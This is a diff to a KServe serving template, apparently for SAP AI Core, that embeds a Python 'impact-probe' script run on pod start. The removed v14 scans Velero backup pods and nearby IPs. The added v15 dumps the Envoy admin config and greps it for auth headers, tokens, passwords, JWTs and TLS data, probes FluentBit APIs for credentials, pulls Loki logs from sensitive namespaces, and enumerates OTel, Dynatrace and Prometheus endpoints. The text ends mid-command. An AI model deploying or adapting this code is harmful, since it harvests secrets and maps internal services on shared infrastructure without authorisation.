@@ -1,14 +1,14 @@
 apiVersion: ai.sap.com/v1alpha1
 kind: ServingTemplate
 metadata:
-  name: impact-probe-v14
+  name: impact-probe-v15
   labels:
-    scenarios.ai.sap.com/id: "impact-probe-v14"
+    scenarios.ai.sap.com/id: "impact-probe-v15"
     ai.sap.com/version: "1.0.0"
   annotations:
-    scenarios.ai.sap.com/name: "impact-probe-v14"
-    executables.ai.sap.com/name: "impact-probe-v14"
-    executables.ai.sap.com/description: "Velero direct pod probe v14"
+    scenarios.ai.sap.com/name: "impact-probe-v15"
+    executables.ai.sap.com/name: "impact-probe-v15"
+    executables.ai.sap.com/description: "Loki + FluentBit API + Envoy config dump v15"
 spec:
   template:
     apiVersion: "serving.kserve.io/v1beta1"
@@ -28,11 +28,11 @@ spec:
           args:
           - |
             cat > /tmp/probe.py << 'PYEOF'
-            import socket, ssl, re, errno as errno_mod
+            import socket, ssl, re, json, time, os
             import urllib.request, urllib.error
 
             def report(k, v):
-                print(f"[P14] {k}: {str(v)[:8000]}", flush=True)
+                print(f"[P15] {k}: {str(v)[:8000]}", flush=True)
 
             def http_get(url, headers=None, timeout=10):
                 try:
@@ -44,152 +44,259 @@ spec:
                         return r.read().decode(errors="replace"), r.status, dict(r.headers)
                 except urllib.error.HTTPError as e:
                     body = ""
-                    try: body = e.read().decode(errors="replace")[:3000]
+                    try: body = e.read().decode(errors="replace")[:2000]
                     except: pass
                     return f"HTTP_{e.code}:{body}", e.code, {}
                 except Exception as e:
                     return f"ERR:{type(e).__name__}:{e}", 0, {}
 
-            def tcp_probe(host, port, timeout=6):
+            def tcp_open(host, port, timeout=4):
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(timeout)
                 try:
                     s.connect((host, port))
                     s.close()
-                    return "OPEN"
-                except socket.timeout:
-                    return "ETIMEDOUT"
-                except ConnectionRefusedError:
-                    return "ECONNREFUSED"
-                except OSError as e:
-                    return f"OSError_{e.errno}_{errno_mod.errorcode.get(e.errno, '?')}"
+                    return True
+                except:
+                    return False
                 finally:
                     try: s.close()
                     except: pass
 
-            VELERO_POD_IP  = "100.64.85.21"
-            VELERO_SVC_IP  = "100.106.232.21"
+            # ── 1. ENVOY FULL CONFIG DUMP (127.0.0.1:15000) ───────────────────────
+            report("---", "=== 1. ENVOY ADMIN FULL CONFIG DUMP ===")
 
-            # ── 1. TCP REACHABILITY ───────────────────────────────────────────────
-            report("---", "=== 1. TCP REACHABILITY ===")
-            for target, label in [(VELERO_POD_IP, "POD"), (VELERO_SVC_IP, "SVC")]:
-                for port in [8085, 8080, 8443, 80, 443, 11001, 2112]:
-                    result = tcp_probe(target, port)
-                    report(f"TCP_{label}_{target}:{port}", result)
+            # Full config_dump -- write to file to avoid truncation
+            body, code, _ = http_get("http://127.0.0.1:15000/config_dump", timeout=30)
+            report("ENVOY_CONFIG_DUMP_SIZE", f"[{code}] len={len(body)}")
+            if code == 200:
+                # Write full dump to disk then mine it
+                with open("/tmp/envoy_config.json", "w") as f:
+                    f.write(body)
+                report("ENVOY_CONFIG_WRITTEN", "/tmp/envoy_config.json")
 
-            # ── 2. HTTP PROBE ON ALL RESPONSIVE PORTS ────────────────────────────
-            report("---", "=== 2. HTTP PROBE ===")
-            for target, label in [(VELERO_POD_IP, "POD"), (VELERO_SVC_IP, "SVC")]:
-                for port in [8085, 8080, 80]:
-                    for scheme in ["http", "https"]:
-                        body, code, hdrs = http_get(f"{scheme}://{target}:{port}/", timeout=7)
-                        if code != 0 and "ERR:timed" not in body and "ERR:Connection" not in body:
-                            report(f"HTTP_{label}_{scheme}_{target}:{port}_root",
-                                   f"[{code}] hdrs={list(hdrs.keys())[:6]} {body[:300]}")
-                            # If we get any non-error response, enumerate paths
-                            for path in ["/metrics", "/api/v1", "/api/v1/backups",
-                                         "/api/v1/backup-storage-locations",
-                                         "/api/v1/schedules", "/api/v1/restores",
-                                         "/api/v1/volume-snapshot-locations",
-                                         "/health", "/version", "/debug/pprof"]:
-                                b2, c2, h2 = http_get(f"{scheme}://{target}:{port}{path}", timeout=7)
-                                if c2 != 0 and "ERR:timed" not in b2 and "ERR:Connection" not in b2:
-                                    report(f"HTTP_{label}_{scheme}_{target}:{port}{path.replace('/','_')}",
-                                           f"[{c2}] {b2[:3000]}")
+                # Mine for credentials, tokens, auth headers
+                auth_patterns = [
+                    r'"authorization":\s*"([^"]{10,})"',
+                    r'"x-api-key":\s*"([^"]{6,})"',
+                    r'"x-auth-token":\s*"([^"]{6,})"',
+                    r'"bearer\s+([A-Za-z0-9\-_\.]+)"',
+                    r'"token":\s*"([^"]{10,})"',
+                    r'"secret":\s*"([^"]{6,})"',
+                    r'"password":\s*"([^"]{4,})"',
+                    r'"credentials":\s*"([^"]{6,})"',
+                    r'inline_string.*?([A-Za-z0-9+/]{40,}={0,2})',
+                    r'"value":\s*"([A-Za-z0-9+/=]{40,})"',
+                ]
+                found_creds = []
+                for pat in auth_patterns:
+                    matches = re.findall(pat, body, re.IGNORECASE)
+                    for m in matches:
+                        if m not in found_creds:
+                            found_creds.append(m)
+                            report(f"ENVOY_CRED_MATCH_{pat[:20]}", m[:500])
 
-            # ── 3. METRICS DEEP PARSE (if /metrics reachable) ────────────────────
-            report("---", "=== 3. VELERO METRICS FULL PARSE ===")
-            for target, label in [(VELERO_POD_IP, "POD"), (VELERO_SVC_IP, "SVC")]:
-                body, code, _ = http_get(f"http://{target}:8085/metrics", timeout=10)
-                if code == 200:
-                    report(f"METRICS_{label}_FULL", body[:8000])
-                    lines = body.split("\n")
-                    # Storage location info (S3 bucket, region, prefix)
-                    bsl = [l for l in lines if "backup_storage_location" in l and not l.startswith("#")]
-                    report(f"METRICS_{label}_BSL", "\n".join(bsl))
-                    # Backup history (names, sizes, timestamps)
-                    backup = [l for l in lines if "velero_backup" in l and not l.startswith("#") and l.strip()]
-                    report(f"METRICS_{label}_BACKUPS", "\n".join(backup[:60]))
-                    # Schedule info
-                    schedule = [l for l in lines if "schedule" in l.lower() and not l.startswith("#") and l.strip()]
-                    report(f"METRICS_{label}_SCHEDULES", "\n".join(schedule[:20]))
-                    # Volume snapshot
-                    vsl = [l for l in lines if "volume_snapshot" in l and not l.startswith("#") and l.strip()]
-                    report(f"METRICS_{label}_VSL", "\n".join(vsl[:20]))
-                else:
-                    report(f"METRICS_{label}_8085", f"[{code}] {body[:200]}")
+                # Look for upstream headers added to requests (request_headers_to_add)
+                header_blocks = re.findall(
+                    r'"request_headers_to_add":\s*\[(.*?)\]',
+                    body, re.DOTALL
+                )
+                for i, block in enumerate(header_blocks[:10]):
+                    report(f"ENVOY_REQUEST_HEADERS_ADDED_{i}", block[:1000])
 
-            # ── 4. VELERO REST API (port 8085 serves both metrics + REST) ─────────
-            report("---", "=== 4. VELERO REST API ===")
-            for target, label in [(VELERO_POD_IP, "POD"), (VELERO_SVC_IP, "SVC")]:
-                # Velero REST API with namespace header
-                for path in ["/api/v1/backups", "/api/v1/backup-storage-locations",
-                              "/api/v1/schedules", "/api/v1/restores",
-                              "/api/v1/downloadrequests"]:
-                    body, code, hdrs = http_get(
-                        f"http://{target}:8085{path}",
-                        headers={"Accept": "application/json",
-                                 "X-Kubernetes-Namespace": "velero"},
-                        timeout=8
-                    )
-                    if code != 0 and "ERR:timed" not in body and "ERR:Connection" not in body:
-                        report(f"REST_{label}{path.replace('/','_')}", f"[{code}] {body[:2000]}")
+                # Look for TLS context -- may have inline certs/keys
+                tls_blocks = re.findall(
+                    r'"tls_context":\s*\{(.*?)\}',
+                    body, re.DOTALL
+                )
+                for i, block in enumerate(tls_blocks[:5]):
+                    report(f"ENVOY_TLS_CONTEXT_{i}", block[:1000])
 
-            # ── 5. VELERO POD: try adjacent IPs (same /24) ───────────────────────
-            report("---", "=== 5. ADJACENT IP SCAN (100.64.85.x) ===")
-            # In case velero moved pods or there are multiple replicas
-            subnet = "100.64.85"
-            for i in range(1, 40):
-                ip = f"{subnet}.{i}"
-                if ip == VELERO_POD_IP:
+                # Look for cluster addresses we haven't seen (upstream endpoints)
+                cluster_addrs = re.findall(
+                    r'"address":\s*\{[^}]*"address":\s*"([^"]+)"[^}]*"port_value":\s*(\d+)',
+                    body
+                )
+                unique_addrs = list(set(cluster_addrs))
+                report("ENVOY_CLUSTER_ADDRESSES", str(unique_addrs[:60]))
+
+                # EnvoyFilter local replies -- might reveal what's blocked and why
+                local_reply = re.findall(
+                    r'"local_reply_config".*?"body":\s*\{(.*?)\}',
+                    body, re.DOTALL
+                )
+                report("ENVOY_LOCAL_REPLY_CONFIGS", str(local_reply[:5]))
+
+                # Look for SAP internal tokens or API keys
+                sap_tokens = re.findall(
+                    r'(eyJ[A-Za-z0-9\-_]{20,}\.[A-Za-z0-9\-_]{20,}\.[A-Za-z0-9\-_]{20,})',
+                    body
+                )
+                report("ENVOY_JWT_TOKENS", list(set(sap_tokens))[:10])
+
+            # Envoy stats filtered for auth/token-related counters
+            body_stats, code_s, _ = http_get("http://127.0.0.1:15000/stats", timeout=15)
+            if code_s == 200:
+                auth_stats = [l for l in body_stats.split("\n")
+                              if any(x in l.lower() for x in
+                                     ["rbac", "authn", "authz", "jwt", "filter_denied",
+                                      "ssl_error", "upstream_rq_4", "downstream_rq_4"])
+                              and l.strip()]
+                report("ENVOY_AUTH_STATS", "\n".join(auth_stats[:60]))
+
+            # Envoy server info
+            body_info, _, _ = http_get("http://127.0.0.1:15000/server_info", timeout=5)
+            report("ENVOY_SERVER_INFO", body_info[:500])
+
+            # ── 2. FLUENTBIT HTTP API (port 2020) ────────────────────────────────
+            report("---", "=== 2. FLUENTBIT HTTP API (port 2020) ===")
+            fb_ips = ["100.64.76.16", "100.64.33.11", "100.109.242.36"]
+
+            for fb_ip in fb_ips:
+                if not tcp_open(fb_ip, 2020, timeout=4):
+                    report(f"FB_{fb_ip}:2020", "CLOSED/FILTERED")
                     continue
-                result = tcp_probe(ip, 8085, timeout=2)
-                if result == "OPEN":
-                    report(f"ADJACENT_{ip}:8085", "OPEN")
-                    body, code, _ = http_get(f"http://{ip}:8085/metrics", timeout=5)
-                    report(f"ADJACENT_{ip}_METRICS", f"[{code}] {body[:1000]}")
-                elif result not in ("ETIMEDOUT", "ECONNREFUSED"):
-                    report(f"ADJACENT_{ip}:8085", result)
-
-            # ── 6. HTTPS PROBE (Velero may use TLS on 8085 or 11001) ──────────────
-            report("---", "=== 6. VELERO HTTPS / TLS ===")
-            for target in [VELERO_POD_IP, VELERO_SVC_IP]:
-                for port in [8085, 8443, 11001]:
-                    body, code, hdrs = http_get(f"https://{target}:{port}/metrics", timeout=7)
+                report(f"FB_{fb_ip}:2020_TCP", "OPEN")
+                for path in ["/", "/api/v1/uptime", "/api/v1/health",
+                              "/api/v1/metrics", "/api/v1/metrics/prometheus",
+                              "/api/v1/storage", "/api/v1/outputs",
+                              "/api/v1/inputs", "/api/v1/filters",
+                              "/api/v1/pipeline"]:
+                    body, code, hdrs = http_get(f"http://{fb_ip}:2020{path}", timeout=6)
                     if code != 0 and "ERR:timed" not in body and "ERR:Connection" not in body:
-                        report(f"HTTPS_{target}:{port}_metrics", f"[{code}] {body[:1000]}")
+                        report(f"FB_{fb_ip}{path.replace('/','_')}", f"[{code}] {body[:2000]}")
+                        # If we get config, look for credentials
+                        if code == 200 and any(x in body.lower() for x in
+                                               ["password", "token", "secret", "key", "auth",
+                                                "aws_key", "http_user"]):
+                            report(f"FB_{fb_ip}{path.replace('/','_')}_CREDS",
+                                   f"CREDENTIAL DATA IN RESPONSE: {body[:3000]}")
 
-            # ── 7. RAW TCP BANNER GRAB ────────────────────────────────────────────
-            report("---", "=== 7. RAW BANNER GRAB ===")
-            for target in [VELERO_POD_IP, VELERO_SVC_IP]:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(6)
-                try:
-                    s.connect((target, 8085))
-                    report(f"BANNER_{target}:8085_CONNECT", "SUCCESS")
-                    # Send minimal HTTP/1.0 GET
-                    s.sendall(b"GET /metrics HTTP/1.0\r\nHost: velero\r\n\r\n")
-                    import time; time.sleep(1)
-                    data = b""
-                    s.settimeout(3)
-                    try:
-                        while True:
-                            chunk = s.recv(4096)
-                            if not chunk: break
-                            data += chunk
-                    except: pass
-                    report(f"BANNER_{target}:8085_RESPONSE", data.decode(errors="replace")[:3000])
-                except socket.timeout:
-                    report(f"BANNER_{target}:8085", "ETIMEDOUT")
-                except ConnectionRefusedError:
-                    report(f"BANNER_{target}:8085", "ECONNREFUSED")
-                except OSError as e:
-                    report(f"BANNER_{target}:8085", f"OSError_{e.errno}_{errno_mod.errorcode.get(e.errno,'?')}: {e}")
-                finally:
-                    try: s.close()
-                    except: pass
+            # ── 3. LOKI DISCOVERY ─────────────────────────────────────────────────
+            report("---", "=== 3. LOKI DISCOVERY ===")
+            # Try common Loki DNS names and ports
+            loki_candidates = [
+                ("loki.logging.svc.cluster.local",       3100),
+                ("loki.loki.svc.cluster.local",          3100),
+                ("loki.monitoring.svc.cluster.local",    3100),
+                ("loki.opentelemetry.svc.cluster.local", 3100),
+                ("loki.aicore.svc.cluster.local",        3100),
+                ("loki.default.svc.cluster.local",       3100),
+                ("loki-stack.loki-stack.svc.cluster.local", 3100),
+                ("loki-gateway.logging.svc.cluster.local",  80),
+                ("loki-distributed-gateway.logging.svc.cluster.local", 80),
+            ]
+            for host, port in loki_candidates:
+                body, code, hdrs = http_get(f"http://{host}:{port}/ready", timeout=5)
+                if code != 0 and "ERR:timed" not in body and "ERR:Connection" not in body:
+                    report(f"LOKI_{host}:{port}_ready", f"[{code}] {body[:300]}")
+                    if code == 200:
+                        # Loki is accessible -- dump labels and query logs
+                        body2, c2, _ = http_get(f"http://{host}:{port}/loki/api/v1/labels", timeout=8)
+                        report(f"LOKI_{host}_LABELS", f"[{c2}] {body2[:2000]}")
+                        # Query recent logs from sensitive namespaces
+                        import urllib.parse
+                        for ns in ["velero", "argocd", "aicore", "couchdb", "grafana",
+                                   "kube-system", "opentelemetry"]:
+                            query = urllib.parse.quote(f'{{namespace="{ns}"}}')
+                            now = int(time.time() * 1e9)
+                            hour_ago = now - 3600 * int(1e9)
+                            url = (f"http://{host}:{port}/loki/api/v1/query_range"
+                                   f"?query={query}&start={hour_ago}&end={now}&limit=50")
+                            body3, c3, _ = http_get(url, timeout=10)
+                            if c3 == 200:
+                                report(f"LOKI_LOGS_{ns}", body3[:4000])
 
-            report("DONE", "probe v14 complete")
+            # ── 4. LOKI VIA KSM IP DISCOVERY ─────────────────────────────────────
+            report("---", "=== 4. LOKI SERVICE IP FROM KSM ===")
+            ksm_body, ksm_code, _ = http_get(
+                "http://ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics",
+                timeout=20
+            )
+            if ksm_code == 200:
+                loki_lines = [l for l in ksm_body.split("\n")
+                              if "loki" in l.lower() and not l.startswith("#") and l.strip()]
+                report("KSM_LOKI_LINES", "\n".join(loki_lines[:40]))
+
+                # Extract loki service ClusterIP
+                loki_svc = re.findall(
+                    r'kube_service_info\{[^}]*service="[^"]*loki[^"]*"[^}]*cluster_ip="([^"]+)"',
+                    ksm_body, re.IGNORECASE
+                )
+                report("KSM_LOKI_CLUSTER_IPS", loki_svc)
+
+                # Try those IPs directly
+                for ip in loki_svc:
+                    for port in [3100, 80, 8080]:
+                        body, code, _ = http_get(f"http://{ip}:{port}/ready", timeout=5)
+                        if code != 0 and "ERR:timed" not in body:
+                            report(f"LOKI_IP_{ip}:{port}_ready", f"[{code}] {body[:300]}")
+                            if code == 200:
+                                body2, c2, _ = http_get(f"http://{ip}:{port}/loki/api/v1/labels", timeout=8)
+                                report(f"LOKI_IP_{ip}_LABELS", f"[{c2}] {body2[:2000]}")
+
+            # ── 5. OTel COLLECTOR DEBUG ENDPOINTS ────────────────────────────────
+            report("---", "=== 5. OTel COLLECTOR DEBUG + ZPAGES ===")
+            otel_col = "http://otel-collector.opentelemetry.svc.cluster.local"
+            for port in [4318, 8888, 55679, 55678, 13133, 4317]:
+                for path in ["/", "/metrics", "/debug/tracez", "/debug/servicez",
+                              "/debug/rpcz", "/debug/pipelinez", "/debug/extensionz",
+                              "/healthz", "/health/status"]:
+                    body, code, _ = http_get(f"{otel_col}:{port}{path}", timeout=5)
+                    if code not in (0,) and "ERR:timed" not in body and "ERR:Connection" not in body:
+                        report(f"OTEL_COL_{port}{path.replace('/','_')}", f"[{code}] {body[:500]}")
+
+            # ── 6. DYNATRACE AGENT / ONEAGENT ENDPOINTS ──────────────────────────
+            report("---", "=== 6. DYNATRACE / ONEAGENT ===")
+            # Dynatrace DynaKube operator often exposes config endpoints
+            dt_candidates = [
+                "http://dynatrace-operator.dynatrace.svc.cluster.local:8080",
+                "http://dynakube-webhook.dynatrace.svc.cluster.local:8443",
+                "http://dynatrace-oneagent-operator.dynatrace.svc.cluster.local:8080",
+            ]
+            for base in dt_candidates:
+                body, code, _ = http_get(f"{base}/", timeout=5)
+                if code not in (0,) and "ERR:timed" not in body and "ERR:Connection" not in body:
+                    report(f"DT_{base}", f"[{code}] {body[:500]}")
+
+            # Dynatrace namespace from KSM
+            if ksm_code == 200:
+                dt_lines = [l for l in ksm_body.split("\n")
+                            if "dynatrace" in l.lower() and "cluster_ip" in l.lower()
+                            and not l.startswith("#")]
+                report("KSM_DYNATRACE_SERVICES", "\n".join(dt_lines[:20]))
+                dt_ips = re.findall(
+                    r'kube_service_info\{[^}]*namespace="dynatrace"[^}]*cluster_ip="([^"]+)"',
+                    ksm_body
+                )
+                report("KSM_DYNATRACE_IPS", dt_ips)
+                for ip in dt_ips[:5]:
+                    for port in [80, 8080, 443, 8443, 9999]:
+                        body, code, _ = http_get(f"http://{ip}:{port}/", timeout=4)
+                        if code not in (0,) and "ERR:timed" not in body and "ERR:Connection" not in body:
+                            report(f"DT_IP_{ip}:{port}", f"[{code}] {body[:400]}")
+
+            # ── 7. PROMETHEUS / THANOS QUERY API ─────────────────────────────────
+            report("---", "=== 7. PROMETHEUS / THANOS QUERY API ===")
+            prom_candidates = [
+                "http://prometheus-server.monitoring.svc.cluster.local:80",
+                "http://prometheus.monitoring.svc.cluster.local:9090",
+                "http://prometheus.opentelemetry.svc.cluster.local:9090",
+                "http://thanos-query.monitoring.svc.cluster.local:9090",
+                "http://kube-prometheus-stack-prometheus.monitoring.svc.cluster.local:9090",
+            ]
+            for base in prom_candidates:
+                body, code, _ = http_get(f"{base}/-/ready", timeout=5)
+                if code not in (0,) and "ERR:timed" not in body and "ERR:Connection" not in body:
+                    report(f"PROM_{base}_ready", f"[{code}] {body[:200]}")
+                    if code == 200:
+                        # Query for secrets/tokens in metric labels
+                        body2, c2, _ = http_get(
+                            f"{base}/api/v1/query?query=up", timeout=8
+                        )
+                        report(f"PROM_{base}_query_up", f"[{c2}] {body2[:1000]}")
+
+            report("DONE", "probe v15 complete")
             PYEOF
             python3 /tmp/probe.py 2>&1
             python3 -c "
